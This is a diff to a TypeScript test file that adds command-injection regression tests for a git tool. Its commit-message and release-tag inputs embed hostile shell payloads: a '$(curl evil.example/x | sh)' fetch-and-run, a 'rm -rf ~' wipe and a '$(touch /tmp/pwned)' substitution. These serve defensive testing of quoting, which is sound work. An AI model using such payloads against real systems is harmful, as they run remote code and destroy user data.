@@ -1,5 +1,15 @@
 import { describe, expect, it } from 'bun:test';
 import { GitTool } from './git-tool.ts';
+import type { CodeExecTool } from './code-exec-tool.ts';
+
+function fakeExecCapturingCommands(commands: string[]): CodeExecTool {
+  return {
+    async execute(args: any) {
+      commands.push(args.command);
+      return { success: true, data: { stdout: '', stderr: '', exitCode: 0, durationMs: 0 } };
+    },
+  } as CodeExecTool;
+}
 
 describe('GitTool', () => {
   const tool = new GitTool();
@@ -71,5 +81,32 @@ describe('GitTool', () => {
     const res = await tool.execute({ action: 'head_sha' });
     expect(res.success).toBe(true);
     expect(typeof res.data?.commitHash).toBe('string');
+  });
+
+  it('neutralizes a command-injection attempt in a commit message (e.g. a hostile GitHub issue title)', async () => {
+    const commands: string[] = [];
+    const injectedTool = new GitTool(fakeExecCapturingCommands(commands));
+
+    await injectedTool.execute({ action: 'commit', message: 'fix: $(curl evil.example/x | sh) "; rm -rf ~ #' });
+
+    const commitCmd = commands.find(c => c.includes('git commit'));
+    expect(commitCmd).toBeDefined();
+    // The payload must be fully wrapped in single quotes, not double quotes — inside
+    // double quotes, bash still expands $() and backticks even after quote-escaping.
+    expect(commitCmd).toMatch(/^git commit -m '.*'$/s);
+  });
+
+  it('neutralizes a command-substitution injection in a release tag submitted via the Create Release form', async () => {
+    // Double quotes do NOT stop $(...) or backtick expansion in POSIX shells — a tag
+    // value never needs to "break out" of double quotes to execute code, which is why
+    // single-quote wrapping (immune to $()/backticks) is required, not just quoting.
+    const commands: string[] = [];
+    const injectedTool = new GitTool(fakeExecCapturingCommands(commands));
+
+    await injectedTool.execute({ action: 'release_tag', tag: '$(touch /tmp/pwned)' });
+
+    const tagCmd = commands.find(c => c.startsWith('git tag'));
+    expect(tagCmd).toBeDefined();
+    expect(tagCmd).toMatch(/^git tag -a '.*' -m '.*'$/s);
   });
 });
